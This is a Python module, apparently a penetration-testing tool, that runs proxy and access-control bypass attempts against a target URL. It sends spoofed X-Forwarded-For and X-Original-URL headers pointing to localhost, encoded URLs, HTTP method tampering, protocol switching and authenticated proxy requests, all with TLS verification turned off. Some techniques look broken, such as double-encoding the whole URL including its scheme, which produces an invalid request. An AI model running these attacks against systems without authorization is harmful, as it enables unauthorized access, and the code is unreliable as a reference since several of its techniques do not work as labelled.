"""
Proxy Bypass Testing Module

IMPORTANT: This tool should only be used for:
- Authorized penetration testing engagements
- Security research in controlled environments
- Testing proxy configurations you own or have permission to test
- Network security assessments with proper authorization

Unauthorized use is illegal and unethical.
"""

import logging
import requests
import urllib.parse
from typing import Dict, Any, List, Optional
import base64

logger = logging.getLogger(__name__)


class ProxyBypassTester:
    """
    Tests various proxy bypass techniques for security assessments.

    IMPORTANT: Only use for authorized security testing.
    """

    def __init__(self):
        self.timeout = 30
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'RedTeam-ProxyBypass/1.0'
        })

    def test_basic_proxy(self, target_url: str, proxy: str) -> Dict[str, Any]:
        """
        Test basic proxy connection.

        Args:
            target_url: The target URL to access
            proxy: Proxy server (e.g., "http://proxy.example.com:8080")

        Returns:
            Dictionary with test results
        """
        logger.warning(f"Testing basic proxy: {proxy} -> {target_url}")

        try:
            proxies = {
                "http": proxy,
                "https": proxy
            }

            response = self.session.get(
                target_url,
                proxies=proxies,
                timeout=self.timeout,
                verify=False
            )

            return {
                "success": True,
                "technique": "basic_proxy",
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_text": response.text[:1000],  # Limit response size
                "headers": dict(response.headers),
                "bypassed": response.status_code == 200
            }

        except requests.exceptions.ProxyError as e:
            logger.error(f"Proxy error: {e}")
            return {
                "success": False,
                "technique": "basic_proxy",
                "error": f"Proxy error: {str(e)}",
                "bypassed": False
            }

        except requests.exceptions.Timeout:
            return {
                "success": False,
                "technique": "basic_proxy",
                "error": "Request timeout",
                "bypassed": False
            }

        except Exception as e:
            logger.error(f"Error testing basic proxy: {e}")
            return {
                "success": False,
                "technique": "basic_proxy",
                "error": str(e),
                "bypassed": False
            }

    def test_header_manipulation(self, target_url: str, proxy: str = None) -> Dict[str, Any]:
        """
        Test proxy bypass using header manipulation techniques.

        Common bypass headers:
        - X-Forwarded-For
        - X-Original-URL
        - X-Rewrite-URL
        - X-Custom-IP-Authorization
        """
        logger.warning(f"Testing header manipulation bypass: {target_url}")

        bypass_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Original-URL': target_url,
            'X-Rewrite-URL': target_url,
            'X-Custom-IP-Authorization': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Host': '127.0.0.1'
        }

        try:
            proxies = {"http": proxy, "https": proxy} if proxy else None

            response = self.session.get(
                target_url,
                headers=bypass_headers,
                proxies=proxies,
                timeout=self.timeout,
                verify=False
            )

            return {
                "success": True,
                "technique": "header_manipulation",
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_text": response.text[:1000],
                "headers_used": bypass_headers,
                "bypassed": response.status_code == 200
            }

        except Exception as e:
            logger.error(f"Error testing header manipulation: {e}")
            return {
                "success": False,
                "technique": "header_manipulation",
                "error": str(e),
                "bypassed": False
            }

    def test_url_encoding(self, target_url: str, proxy: str = None) -> Dict[str, Any]:
        """
        Test proxy bypass using URL encoding techniques.
        """
        logger.warning(f"Testing URL encoding bypass: {target_url}")

        # Parse URL
        parsed = urllib.parse.urlparse(target_url)

        # Try different encoding techniques
        techniques = []

        # Double URL encoding
        try:
            double_encoded = target_url.replace('/', '%252F').replace(':', '%253A')
            proxies = {"http": proxy, "https": proxy} if proxy else None

            response = self.session.get(
                double_encoded,
                proxies=proxies,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )

            techniques.append({
                "encoding": "double_url_encoding",
                "url": double_encoded,
                "status_code": response.status_code,
                "bypassed": response.status_code == 200
            })

        except Exception as e:
            techniques.append({
                "encoding": "double_url_encoding",
                "error": str(e),
                "bypassed": False
            })

        # Unicode encoding
        try:
            unicode_encoded = target_url.encode('unicode_escape').decode('ascii')
            response = self.session.get(
                unicode_encoded,
                proxies=proxies,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )

            techniques.append({
                "encoding": "unicode_encoding",
                "url": unicode_encoded,
                "status_code": response.status_code,
                "bypassed": response.status_code == 200
            })

        except Exception as e:
            techniques.append({
                "encoding": "unicode_encoding",
                "error": str(e),
                "bypassed": False
            })

        return {
            "success": True,
            "technique": "url_encoding",
            "techniques_tested": techniques,
            "bypassed": any(t.get("bypassed", False) for t in techniques)
        }

    def test_http_method_bypass(self, target_url: str, proxy: str = None) -> Dict[str, Any]:
        """
        Test proxy bypass using different HTTP methods.
        """
        logger.warning(f"Testing HTTP method bypass: {target_url}")

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        results = []

        proxies = {"http": proxy, "https": proxy} if proxy else None

        for method in methods:
            try:
                response = self.session.request(
                    method,
                    target_url,
                    proxies=proxies,
                    timeout=self.timeout,
                    verify=False
                )

                results.append({
                    "method": method,
                    "status_code": response.status_code,
                    "bypassed": response.status_code == 200,
                    "response_length": len(response.text)
                })

            except Exception as e:
                results.append({
                    "method": method,
                    "error": str(e),
                    "bypassed": False
                })

        return {
            "success": True,
            "technique": "http_method_bypass",
            "methods_tested": results,
            "bypassed": any(r.get("bypassed", False) for r in results)
        }

    def test_protocol_switching(self, target_url: str, proxy: str = None) -> Dict[str, Any]:
        """
        Test proxy bypass by switching protocols (HTTP/HTTPS).
        """
        logger.warning(f"Testing protocol switching bypass: {target_url}")

        results = []

        # Try switching HTTP to HTTPS
        if target_url.startswith('http://'):
            https_url = target_url.replace('http://', 'https://')
        elif target_url.startswith('https://'):
            https_url = target_url
        else:
            https_url = 'https://' + target_url

        # Try HTTPS
        try:
            proxies = {"http": proxy, "https": proxy} if proxy else None

            response = self.session.get(
                https_url,
                proxies=proxies,
                timeout=self.timeout,
                verify=False
            )

            results.append({
                "protocol": "https",
                "url": https_url,
                "status_code": response.status_code,
                "bypassed": response.status_code == 200
            })

        except Exception as e:
            results.append({
                "protocol": "https",
                "url": https_url,
                "error": str(e),
                "bypassed": False
            })

        # Try HTTP
        if target_url.startswith('https://'):
            http_url = target_url.replace('https://', 'http://')
        elif target_url.startswith('http://'):
            http_url = target_url
        else:
            http_url = 'http://' + target_url

        try:
            response = self.session.get(
                http_url,
                proxies=proxies,
                timeout=self.timeout,
                verify=False
            )

            results.append({
                "protocol": "http",
                "url": http_url,
                "status_code": response.status_code,
                "bypassed": response.status_code == 200
            })

        except Exception as e:
            results.append({
                "protocol": "http",
                "url": http_url,
                "error": str(e),
                "bypassed": False
            })

        return {
            "success": True,
            "technique": "protocol_switching",
            "protocols_tested": results,
            "bypassed": any(r.get("bypassed", False) for r in results)
        }

    def test_all_techniques(self, target_url: str, proxy: str = None) -> Dict[str, Any]:
        """
        Test all proxy bypass techniques.

        Args:
            target_url: The target URL to access
            proxy: Optional proxy server

        Returns:
            Dictionary with results from all techniques
        """
        logger.warning(f"Testing all proxy bypass techniques: {target_url}")

        results = {
            "target_url": target_url,
            "proxy": proxy,
            "techniques": []
        }

        # Test basic proxy (if proxy provided)
        if proxy:
            basic_result = self.test_basic_proxy(target_url, proxy)
            results["techniques"].append(basic_result)

        # Test header manipulation
        header_result = self.test_header_manipulation(target_url, proxy)
        results["techniques"].append(header_result)

        # Test URL encoding
        encoding_result = self.test_url_encoding(target_url, proxy)
        results["techniques"].append(encoding_result)

        # Test HTTP method bypass
        method_result = self.test_http_method_bypass(target_url, proxy)
        results["techniques"].append(method_result)

        # Test protocol switching
        protocol_result = self.test_protocol_switching(target_url, proxy)
        results["techniques"].append(protocol_result)

        # Determine if any technique succeeded
        results["any_bypassed"] = any(
            t.get("bypassed", False) for t in results["techniques"]
        )

        # Count successful bypasses
        results["successful_techniques"] = sum(
            1 for t in results["techniques"] if t.get("bypassed", False)
        )

        results["total_techniques"] = len(results["techniques"])

        return results

    def test_custom_proxy_auth(self, target_url: str, proxy: str,
                               username: str = None, password: str = None) -> Dict[str, Any]:
        """
        Test proxy with authentication.

        Args:
            target_url: The target URL to access
            proxy: Proxy server
            username: Proxy username
            password: Proxy password

        Returns:
            Dictionary with test results
        """
        logger.warning(f"Testing proxy with authentication: {proxy}")

        try:
            # Build proxy URL with auth
            if username and password:
                parsed = urllib.parse.urlparse(proxy)
                proxy_with_auth = f"{parsed.scheme}://{username}:{password}@{parsed.netloc}"
                proxies = {
                    "http": proxy_with_auth,
                    "https": proxy_with_auth
                }
            else:
                proxies = {
                    "http": proxy,
                    "https": proxy
                }

            response = self.session.get(
                target_url,
                proxies=proxies,
                timeout=self.timeout,
                verify=False
            )

            return {
                "success": True,
                "technique": "proxy_with_auth",
                "status_code": response.status_code,
                "response_length": len(response.text),
                "authenticated": username is not None,
                "bypassed": response.status_code == 200
            }

        except Exception as e:
            logger.error(f"Error testing proxy with auth: {e}")
            return {
                "success": False,
                "technique": "proxy_with_auth",
                "error": str(e),
                "bypassed": False
            }

    def close(self):
        """Clean up resources"""
        self.session.close()
